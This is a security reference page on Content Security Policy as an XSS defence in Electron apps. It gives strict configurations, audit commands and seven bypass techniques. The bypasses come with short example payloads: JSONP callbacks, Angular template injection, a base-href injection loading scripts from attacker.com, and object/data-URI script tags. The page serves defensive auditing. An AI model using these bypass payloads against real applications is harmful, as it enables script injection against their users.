---
title: CSP as Sanitizer
description: Content Security Policy effectiveness, bypass vectors, and Electron-specific considerations
---

# CSP as Sanitizer

Content Security Policy (CSP) is a browser security mechanism that prevents execution of injected scripts. As a **taint chain sanitizer**, it acts on the XSS step of the chain — a broken taint chain at the render point. But CSP has important limits and bypasses.

---

## What CSP Breaks

CSP's primary goal: prevent execution of attacker-injected JavaScript.

```
XSS payload injected: <script>eval(attacker_code)</script>
         │
         ▼ CSP active (script-src 'self')
Browser checks: does this script's origin match 'self'?
         │
         ├── Inline script → BLOCKED (no nonce/hash)
         ├── External script from attacker.com → BLOCKED (not 'self')
         └── External script from app's own origin → ALLOWED

Result: attacker's code doesn't execute → taint chain broken
```

---

## Strict CSP Configuration

```html
<!-- Strong CSP for Electron apps: -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'nonce-RANDOM_NONCE';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.myapp.com;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
">
```

Or via webRequest in main.js:

```javascript
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [
        "default-src 'self'; " +
        "script-src 'self'; " +
        "object-src 'none'; " +
        "base-uri 'self';"
      ]
    }
  });
});
```

---

## CSP Bypass Techniques

### 1. JSONP Endpoints on Allowlisted Domains

If your CSP allowlists `https://api.myapp.com`:

```
CSP: script-src 'self' https://api.myapp.com

Attack: <script src="https://api.myapp.com/v1/users?callback=alert(1)"></script>
```

If the API has a JSONP endpoint that reflects the `callback` parameter as JavaScript, the allowlisted domain becomes a script execution vector.

### 2. Angular / Vue Template Injection

Framework template engines execute within CSP if their runtime is allowlisted:

```
CSP: script-src 'self' (Angular app loaded from 'self')

Attack: {{ constructor.constructor('alert(1)')() }}
```

Angular's template sandbox is not a security boundary — any Angular expression execution bypasses CSP because Angular itself is running from 'self'.

### 3. unsafe-eval

```javascript
// If CSP includes 'unsafe-eval':
// - eval() works → eval(attacker_code) bypasses CSP
// - new Function() works
// - setTimeout('string') works
// - Vue/React SSR compilation works (often the reason it's included)
```

### 4. unsafe-inline

The most common mistake:

```
script-src 'self' 'unsafe-inline'
```

This allows any inline `<script>` tag, any `onclick=`, any `onerror=`, any `<a href="javascript:">`. CSP is completely ineffective.

### 5. base-uri Not Set

Without `base-uri 'self'`:

```html
<!-- Attacker can inject: -->
<base href="https://attacker.com/">

<!-- All relative URLs now load from attacker.com: -->
<script src="./vendor.js"></script>
<!-- → loads https://attacker.com/vendor.js → CSP bypassed -->
```

### 6. object-src Not Blocked

Without `object-src 'none'`:

```html
<object data="data:text/html,<script>alert(1)</script>">
<!-- object/embed can load HTML — script executes in its own context -->
<!-- Depending on Electron version, may bypass CSP -->
```

### 7. data: URIs in script-src

```
script-src 'self' data:
```

Allows:
```html
<script src="data:text/javascript,alert(1)"></script>
```

---

## CSP in Electron: Specific Considerations

### file:// Protocol

When Electron loads from `file://`, CSP `'self'` means "same file directory":

```javascript
// CSP 'self' for file:// means:
// file:///path/to/app/ and subdirectories

// Attack implication: if attacker can write to app directory,
// they can inject scripts that CSP considers 'self'
// This is why fuse: OnlyLoadAppFromAsar matters
```

### Custom Protocol

With a custom protocol (`app://`):

```javascript
protocol.handle('app', (req) => {
  // 'self' in CSP context = 'app://main'
  // Other app:// subdomains may or may not be 'self'
});

// CSP for custom protocol apps:
// script-src app://main  (more restrictive than 'self')
```

### No CSP at All

Electron does NOT enforce CSP by default — apps must opt in:

```bash
# Check if any CSP is configured:
grep -rn "Content-Security-Policy\|defaultSrc\|scriptSrc" \
  --include="*.js" --include="*.html" . | grep -v node_modules

# Electronegativity also checks for missing CSP:
electronegativity -i . | grep -i "csp\|policy"
```

A missing CSP is a finding — typically rated P4/Low but valid.

---

## CSP Effectiveness by Bypass Type

| CSP Directive | What It Stops | Common Bypass |
|---------------|--------------|---------------|
| `script-src 'self'` | External script injection | JSONP on allowlisted domain |
| No `unsafe-inline` | Inline `<script>` | Nonce theft (requires XSS first) |
| No `unsafe-eval` | `eval()`, `Function()` | Template injection in allowed framework |
| `object-src 'none'` | `<object>/<embed>` plugins | None (correct) |
| `base-uri 'self'` | `<base>` injection | None (correct) |
| `frame-ancestors 'none'` | Clickjacking | None (correct) |
| `connect-src 'self'` | Data exfiltration | DNS prefetch (limited) |

---

## CSP as Defense Layer

CSP is a **secondary defense** in the XSS→RCE chain:

```
XSS → CSP → blocked?
  │     │
  │     └── If strict + no bypasses → XSS blocked → chain stops here
  │         If weak (unsafe-inline/eval) → XSS executes
  │
  └── Even if XSS executes:
      → contextIsolation:true → can't reach preload
      → sandbox:true → can't reach OS directly
      → Strict IPC → can't reach dangerous handlers
```

Multiple layers is the goal — CSP failure doesn't mean game over if other defenses hold.
